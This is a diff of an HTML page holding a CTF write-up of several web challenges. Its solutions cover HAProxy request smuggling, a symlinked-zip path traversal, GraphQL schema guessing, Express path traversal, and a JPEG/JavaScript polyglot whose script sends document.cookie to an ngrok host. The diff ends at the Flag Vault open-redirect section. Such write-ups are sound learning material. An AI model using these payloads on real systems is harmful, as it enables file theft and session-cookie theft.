@@ -66,23 +66,24 @@ Can you find the weak link?&lt;/p>
 &lt;/blockquote>
 &lt;p>&lt;strong>Description&lt;/strong>&lt;/p>
 &lt;p>This challenge presents a plain static website and an attachment called &lt;code>ha.cfg&lt;/code>, which is the config file for &lt;a href="http://www.haproxy.org/">HAProxy&lt;/a>. In the file there are two interesting entries:&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-plaintext" data-lang="plaintext">http-request deny if { path_beg /flag }
-http-request deny if { path,url_dec -m reg ^.*/?flag/?.*$ }
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>We can guess that the flag is hidden behind the &lt;code>/flag&lt;/code> endpoint.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-plaintext" data-lang="plaintext">&lt;span style="display:flex;">&lt;span>http-request deny if { path_beg /flag }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>http-request deny if { path,url_dec -m reg ^.*/?flag/?.*$ }
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>We can guess that the flag is hidden behind the &lt;code>/flag&lt;/code> endpoint.&lt;/p>
 &lt;p>&lt;strong>Solution&lt;/strong>&lt;/p>
 &lt;p>My first approach was to try and break the regex, with disappointing results. I then educated myself on &lt;a href="https://portswigger.net/web-security/request-smuggling">HTTP Smuggling attacks&lt;/a>. And guess what?! HAProxy version &amp;lt; 2.0.25, 2.2.17, 2.3.14 and 2.4.4 are vulnerable to an &lt;a href="https://jfrog.com/blog/critical-vulnerability-in-haproxy-cve-2021-40346-integer-overflow-enables-http-smuggling/">Integer Overflow attack&lt;/a> that enables HTTP Smuggling!&lt;/p>
 &lt;p>After a few unfortunate manual takes, I used &lt;a href="https://github.com/alikarimi999/CVE-2021-40346/blob/main/exploit.py">this tool&lt;/a> which worked like a charm.&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-plaintext" data-lang="plaintext">...
-HTTP/1.1 200 OK
-server: nginx/1.21.4
-date: Wed, 17 Nov 2021 00:09:42 GMT
-content-type: text/html
-content-length: 29
-last-modified: Fri, 12 Nov 2021 20:51:37 GMT
-etag: &amp;#34;618ed3d9-1d&amp;#34;
-accept-ranges: bytes
-INTENT{Smuggl3_w1th_H4_Pr0xy}
-&lt;/code>&lt;/pre>&lt;/div>&lt;h1 id="careers">Careers&lt;/h1>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-plaintext" data-lang="plaintext">&lt;span style="display:flex;">&lt;span>...
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>HTTP/1.1 200 OK
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>server: nginx/1.21.4
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>date: Wed, 17 Nov 2021 00:09:42 GMT
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>content-type: text/html
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>content-length: 29
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>last-modified: Fri, 12 Nov 2021 20:51:37 GMT
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>etag: &amp;#34;618ed3d9-1d&amp;#34;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>accept-ranges: bytes
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>INTENT{Smuggl3_w1th_H4_Pr0xy}
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h1 id="careers">Careers&lt;/h1>
 &lt;blockquote>
 &lt;p>We got hacked,
 we&amp;rsquo;re trying to indentify the ROOT cause.
@@ -92,12 +93,12 @@ If you are a l33t h4x0r, please upload your resume.&lt;/p>
 &lt;p>The attached URL brings us to a website which has a &lt;em>Careers&lt;/em> section, where we can upload our résumé in .txt format, zipped. We are pretty sure we need to tinker with this upload form in order to get our flag.&lt;/p>
 &lt;p>&lt;strong>Solution&lt;/strong>&lt;/p>
 &lt;p>Well, first things first, when we deal with upload forms and zips, I always try to add - let&amp;rsquo;s say - &lt;em>interesting&lt;/em> files to my compressed archive.&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">&lt;span style="color:#75715e"># Let&amp;#39;s try the oldest trick in the book&lt;/span>
-ln -fs ../../../../../flag havce.txt
-zip --symlinks havce.zip havce.txt
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>Let&amp;rsquo;s apply to this job with this resume. 🤭&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">INTENT&lt;span style="color:#f92672">{&lt;/span>zipfiles_are_awsome_for_pt&lt;span style="color:#f92672">}&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;h1 id="graphics">GraphiCS&lt;/h1>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Let&amp;#39;s try the oldest trick in the book&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ln -fs ../../../../../flag havce.txt
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>zip --symlinks havce.zip havce.txt
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Let&amp;rsquo;s apply to this job with this resume. 🤭&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>INTENT&lt;span style="color:#f92672">{&lt;/span>zipfiles_are_awsome_for_pt&lt;span style="color:#f92672">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h1 id="graphics">GraphiCS&lt;/h1>
 &lt;blockquote>
 &lt;p>What is your problem?
 How didn&amp;rsquo;t you approve my beautiful innovative page on your &amp;ldquo;precious&amp;rdquo; CTF?!
@@ -107,36 +108,44 @@ It&amp;rsquo;s all done, maybe I can just add some graphics.&lt;/p>
 &lt;p>The challenge presents a website that makes a single query to a GraphQL endpoint. We probably need to extract the flag from there.&lt;/p>
 &lt;p>&lt;strong>Solution&lt;/strong>&lt;/p>
 &lt;p>Immediately tried introspection, but it was disabled. Luckily we can abuse the autocorrection feature and this tool: &lt;a href="https://github.com/nikitastupin/clairvoyance/">https://github.com/nikitastupin/clairvoyance/&lt;/a>, using a decent word list will reveal that we can use this query to get the flag:&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-json" data-lang="json">{&lt;span style="color:#f92672">&amp;#34;operationName&amp;#34;&lt;/span>:&lt;span style="color:#e6db74">&amp;#34;ExampleQuery&amp;#34;&lt;/span>,&lt;span style="color:#f92672">&amp;#34;variables&amp;#34;&lt;/span>:{},&lt;span style="color:#f92672">&amp;#34;query&amp;#34;&lt;/span>:&lt;span style="color:#e6db74">&amp;#34;query ExampleQuery { _secret { flag } }\n&amp;#34;&lt;/span>}
-&lt;/code>&lt;/pre>&lt;/div>&lt;h1 id="etulosba">Etulosba&lt;/h1>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-json" data-lang="json">&lt;span style="display:flex;">&lt;span>{&lt;span style="color:#f92672">&amp;#34;operationName&amp;#34;&lt;/span>:&lt;span style="color:#e6db74">&amp;#34;ExampleQuery&amp;#34;&lt;/span>,&lt;span style="color:#f92672">&amp;#34;variables&amp;#34;&lt;/span>:{},&lt;span style="color:#f92672">&amp;#34;query&amp;#34;&lt;/span>:&lt;span style="color:#e6db74">&amp;#34;query ExampleQuery { _secret { flag } }\n&amp;#34;&lt;/span>}
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h1 id="etulosba">Etulosba&lt;/h1>
 &lt;blockquote>
 &lt;p>Our spy managed to steal the source code for the Etulosba CDN. We need your help to get the flag from that server.&lt;/p>
 &lt;/blockquote>
 &lt;p>&lt;strong>Description&lt;/strong>&lt;/p>
 &lt;p>We are provided with the source code of what supposedly is a CDN:&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-javascript" data-lang="javascript">&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">fs&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">require&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;fs&amp;#34;&lt;/span>);
-&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">path&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">require&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;path&amp;#34;&lt;/span>);
-&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">express&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">require&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;express&amp;#34;&lt;/span>);
-&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">server&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">express&lt;/span>();
-&lt;span style="color:#a6e22e">server&lt;/span>.&lt;span style="color:#a6e22e">get&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;/&amp;#34;&lt;/span>, &lt;span style="color:#66d9ef">function&lt;/span> (&lt;span style="color:#a6e22e">req&lt;/span>, &lt;span style="color:#a6e22e">res&lt;/span>) {
-&lt;span style="color:#a6e22e">res&lt;/span>.&lt;span style="color:#a6e22e">end&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;&amp;lt;html&amp;gt;&amp;lt;body&amp;gt;etulosba&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;&amp;#34;&lt;/span>);
-});
-&lt;span style="color:#a6e22e">server&lt;/span>.&lt;span style="color:#a6e22e">get&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;/files/images/:name&amp;#34;&lt;/span>, &lt;span style="color:#66d9ef">function&lt;/span> (&lt;span style="color:#a6e22e">req&lt;/span>, &lt;span style="color:#a6e22e">res&lt;/span>) {
-&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#a6e22e">req&lt;/span>.&lt;span style="color:#a6e22e">params&lt;/span>.&lt;span style="color:#a6e22e">name&lt;/span>.&lt;span style="color:#a6e22e">indexOf&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;.&amp;#34;&lt;/span>) &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>) {
-&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#a6e22e">res&lt;/span>.&lt;span style="color:#a6e22e">status&lt;/span>(&lt;span style="color:#ae81ff">400&lt;/span>).&lt;span style="color:#a6e22e">json&lt;/span>({ &lt;span style="color:#a6e22e">error&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#e6db74">&amp;#34;invalid file name&amp;#34;&lt;/span> });
-}
-&lt;span style="color:#a6e22e">res&lt;/span>.&lt;span style="color:#a6e22e">sendFile&lt;/span>(&lt;span style="color:#a6e22e">__dirname&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#a6e22e">path&lt;/span>.&lt;span style="color:#a6e22e">join&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;/files/images/&amp;#34;&lt;/span>, &lt;span style="color:#a6e22e">req&lt;/span>.&lt;span style="color:#a6e22e">params&lt;/span>.&lt;span style="color:#a6e22e">name&lt;/span>));
-});
-&lt;span style="color:#a6e22e">server&lt;/span>.&lt;span style="color:#a6e22e">get&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;/files/binary/:name&amp;#34;&lt;/span>, &lt;span style="color:#66d9ef">function&lt;/span> (&lt;span style="color:#a6e22e">req&lt;/span>, &lt;span style="color:#a6e22e">res&lt;/span>) {
-&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#a6e22e">req&lt;/span>.&lt;span style="color:#a6e22e">params&lt;/span>.&lt;span style="color:#a6e22e">name&lt;/span>.&lt;span style="color:#a6e22e">indexOf&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;.&amp;#34;&lt;/span>) &lt;span style="color:#f92672">!==&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>) {
-&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#a6e22e">res&lt;/span>.&lt;span style="color:#a6e22e">status&lt;/span>(&lt;span style="color:#ae81ff">400&lt;/span>).&lt;span style="color:#a6e22e">json&lt;/span>({ &lt;span style="color:#a6e22e">error&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#e6db74">&amp;#34;invalid file name&amp;#34;&lt;/span> });
-}
-&lt;span style="color:#a6e22e">res&lt;/span>.&lt;span style="color:#a6e22e">sendFile&lt;/span>(&lt;span style="color:#a6e22e">path&lt;/span>.&lt;span style="color:#a6e22e">resolve&lt;/span>(&lt;span style="color:#a6e22e">__dirname&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;/files/binary/&amp;#34;&lt;/span>, &lt;span style="color:#a6e22e">req&lt;/span>.&lt;span style="color:#a6e22e">params&lt;/span>.&lt;span style="color:#a6e22e">name&lt;/span>));
-});
-&lt;span style="color:#a6e22e">fs&lt;/span>.&lt;span style="color:#a6e22e">writeFileSync&lt;/span>(&lt;span style="color:#a6e22e">path&lt;/span>.&lt;span style="color:#a6e22e">join&lt;/span>(&lt;span style="color:#a6e22e">__dirname&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;flag.name&amp;#34;&lt;/span>), &lt;span style="color:#a6e22e">process&lt;/span>.&lt;span style="color:#a6e22e">env&lt;/span>.&lt;span style="color:#a6e22e">FLAG_NAME&lt;/span>);
-&lt;span style="color:#a6e22e">fs&lt;/span>.&lt;span style="color:#a6e22e">writeFileSync&lt;/span>(&lt;span style="color:#a6e22e">path&lt;/span>.&lt;span style="color:#a6e22e">join&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;/tmp&amp;#34;&lt;/span>, &lt;span style="color:#a6e22e">process&lt;/span>.&lt;span style="color:#a6e22e">env&lt;/span>.&lt;span style="color:#a6e22e">FLAG_NAME&lt;/span>), &lt;span style="color:#a6e22e">process&lt;/span>.&lt;span style="color:#a6e22e">env&lt;/span>.&lt;span style="color:#a6e22e">FLAG&lt;/span>);
-&lt;span style="color:#a6e22e">server&lt;/span>.&lt;span style="color:#a6e22e">listen&lt;/span>(&lt;span style="color:#a6e22e">process&lt;/span>.&lt;span style="color:#a6e22e">env&lt;/span>.&lt;span style="color:#a6e22e">HTTP_PORT&lt;/span>);
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;strong>Solution&lt;/strong>&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-javascript" data-lang="javascript">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">fs&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">require&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;fs&amp;#34;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">path&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">require&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;path&amp;#34;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">express&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">require&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;express&amp;#34;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">server&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">express&lt;/span>();
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">server&lt;/span>.&lt;span style="color:#a6e22e">get&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;/&amp;#34;&lt;/span>, &lt;span style="color:#66d9ef">function&lt;/span> (&lt;span style="color:#a6e22e">req&lt;/span>, &lt;span style="color:#a6e22e">res&lt;/span>) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">res&lt;/span>.&lt;span style="color:#a6e22e">end&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;&amp;lt;html&amp;gt;&amp;lt;body&amp;gt;etulosba&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;&amp;#34;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>});
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">server&lt;/span>.&lt;span style="color:#a6e22e">get&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;/files/images/:name&amp;#34;&lt;/span>, &lt;span style="color:#66d9ef">function&lt;/span> (&lt;span style="color:#a6e22e">req&lt;/span>, &lt;span style="color:#a6e22e">res&lt;/span>) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#a6e22e">req&lt;/span>.&lt;span style="color:#a6e22e">params&lt;/span>.&lt;span style="color:#a6e22e">name&lt;/span>.&lt;span style="color:#a6e22e">indexOf&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;.&amp;#34;&lt;/span>) &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#a6e22e">res&lt;/span>.&lt;span style="color:#a6e22e">status&lt;/span>(&lt;span style="color:#ae81ff">400&lt;/span>).&lt;span style="color:#a6e22e">json&lt;/span>({ &lt;span style="color:#a6e22e">error&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#e6db74">&amp;#34;invalid file name&amp;#34;&lt;/span> });
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">res&lt;/span>.&lt;span style="color:#a6e22e">sendFile&lt;/span>(&lt;span style="color:#a6e22e">__dirname&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#a6e22e">path&lt;/span>.&lt;span style="color:#a6e22e">join&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;/files/images/&amp;#34;&lt;/span>, &lt;span style="color:#a6e22e">req&lt;/span>.&lt;span style="color:#a6e22e">params&lt;/span>.&lt;span style="color:#a6e22e">name&lt;/span>));
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>});
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">server&lt;/span>.&lt;span style="color:#a6e22e">get&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;/files/binary/:name&amp;#34;&lt;/span>, &lt;span style="color:#66d9ef">function&lt;/span> (&lt;span style="color:#a6e22e">req&lt;/span>, &lt;span style="color:#a6e22e">res&lt;/span>) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#a6e22e">req&lt;/span>.&lt;span style="color:#a6e22e">params&lt;/span>.&lt;span style="color:#a6e22e">name&lt;/span>.&lt;span style="color:#a6e22e">indexOf&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;.&amp;#34;&lt;/span>) &lt;span style="color:#f92672">!==&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#a6e22e">res&lt;/span>.&lt;span style="color:#a6e22e">status&lt;/span>(&lt;span style="color:#ae81ff">400&lt;/span>).&lt;span style="color:#a6e22e">json&lt;/span>({ &lt;span style="color:#a6e22e">error&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#e6db74">&amp;#34;invalid file name&amp;#34;&lt;/span> });
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">res&lt;/span>.&lt;span style="color:#a6e22e">sendFile&lt;/span>(&lt;span style="color:#a6e22e">path&lt;/span>.&lt;span style="color:#a6e22e">resolve&lt;/span>(&lt;span style="color:#a6e22e">__dirname&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;/files/binary/&amp;#34;&lt;/span>, &lt;span style="color:#a6e22e">req&lt;/span>.&lt;span style="color:#a6e22e">params&lt;/span>.&lt;span style="color:#a6e22e">name&lt;/span>));
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>});
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">fs&lt;/span>.&lt;span style="color:#a6e22e">writeFileSync&lt;/span>(&lt;span style="color:#a6e22e">path&lt;/span>.&lt;span style="color:#a6e22e">join&lt;/span>(&lt;span style="color:#a6e22e">__dirname&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;flag.name&amp;#34;&lt;/span>), &lt;span style="color:#a6e22e">process&lt;/span>.&lt;span style="color:#a6e22e">env&lt;/span>.&lt;span style="color:#a6e22e">FLAG_NAME&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">fs&lt;/span>.&lt;span style="color:#a6e22e">writeFileSync&lt;/span>(&lt;span style="color:#a6e22e">path&lt;/span>.&lt;span style="color:#a6e22e">join&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;/tmp&amp;#34;&lt;/span>, &lt;span style="color:#a6e22e">process&lt;/span>.&lt;span style="color:#a6e22e">env&lt;/span>.&lt;span style="color:#a6e22e">FLAG_NAME&lt;/span>), &lt;span style="color:#a6e22e">process&lt;/span>.&lt;span style="color:#a6e22e">env&lt;/span>.&lt;span style="color:#a6e22e">FLAG&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">server&lt;/span>.&lt;span style="color:#a6e22e">listen&lt;/span>(&lt;span style="color:#a6e22e">process&lt;/span>.&lt;span style="color:#a6e22e">env&lt;/span>.&lt;span style="color:#a6e22e">HTTP_PORT&lt;/span>);
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;strong>Solution&lt;/strong>&lt;/p>
 &lt;p>By quickly looking at the code we can see the usage of &lt;code>path.join&lt;/code> and &lt;code>path.resolve&lt;/code> with user input which can be quite dangerous. Indeed the two endpoints provide two vulnerabilities: we can first read the &lt;code>flag.name&lt;/code> file by requesting &lt;code>https://etulosba.chal.intentsummit.org/files/images/%2E%2E%2F%2E%2E%2Fflag%2Ename&lt;/code> and then query it&amp;rsquo;s contents with &lt;code>https://etulosba.chal.intentsummit.org/files/binary/%2Ftmp%2Fimaflagimaflag&lt;/code>&lt;/p>
 &lt;h1 id="darknet-club">Darknet Club&lt;/h1>
 &lt;blockquote>
@@ -150,13 +159,13 @@ Can you help me get an in?&lt;/p>
 &lt;ol>
 &lt;li>Upload a &amp;ldquo;valid&amp;rdquo; JPEG file that&amp;rsquo;s also a malicious JS script:&lt;/li>
 &lt;/ol>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-javascript" data-lang="javascript">&lt;span style="color:#a6e22e">ÿØÿî&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>;
-&lt;span style="color:#a6e22e">location&lt;/span>.&lt;span style="color:#a6e22e">href&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;//xxxx-xx-xx-xx-xx.ngrok.io?cookies=&amp;#34;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>document.&lt;span style="color:#a6e22e">cookie&lt;/span>;
-&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="2">
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-javascript" data-lang="javascript">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">ÿØÿî&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">location&lt;/span>.&lt;span style="color:#a6e22e">href&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;//xxxx-xx-xx-xx-xx.ngrok.io?cookies=&amp;#34;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>document.&lt;span style="color:#a6e22e">cookie&lt;/span>;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="2">
 &lt;li>Set the referral to load the image as the script:&lt;/li>
 &lt;/ol>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-html" data-lang="html">&amp;lt;&lt;span style="color:#f92672">script&lt;/span> &lt;span style="color:#a6e22e">src&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;https://darknet-club.chal.intentsummit.org/api/avatar/havce_test&amp;#34;&lt;/span>&amp;gt;&amp;lt;/&lt;span style="color:#f92672">script&lt;/span>&amp;gt;
-&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="3">
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-html" data-lang="html">&lt;span style="display:flex;">&lt;span>&amp;lt;&lt;span style="color:#f92672">script&lt;/span> &lt;span style="color:#a6e22e">src&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;https://darknet-club.chal.intentsummit.org/api/avatar/havce_test&amp;#34;&lt;/span>&amp;gt;&amp;lt;/&lt;span style="color:#f92672">script&lt;/span>&amp;gt;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="3">
 &lt;li>Request a review by the admin&lt;/li>
 &lt;/ol>
 &lt;h1 id="flag-vault">Flag Vault&lt;/h1>
@@ -167,8 +176,8 @@ Can you help me get an in?&lt;/p>
 &lt;p>The challenge contains a simple login page that seems to never login and is not vulnerable to basic SQLi. JWT tokens also look same after a bit of fuzzing.&lt;/p>
 &lt;p>&lt;strong>Solution&lt;/strong>&lt;/p>
 &lt;p>The report button suggests we probably need to send a malicious URL to the &amp;ldquo;admin&amp;rdquo;. Seems easy, but it appears to check the domain of the URL to be the same of website the challenge is on. Upon visiting &lt;code>/admin&lt;/code>, we are redirected to &lt;code>/?redirect=/admin&amp;amp;error=INVALID_TOKEN&lt;/code> which probably means we will be redirect to the given URL upon successful login (something we cannot test). Checking the redirect login we can see it&amp;rsquo;s not very safe:&lt;/p>
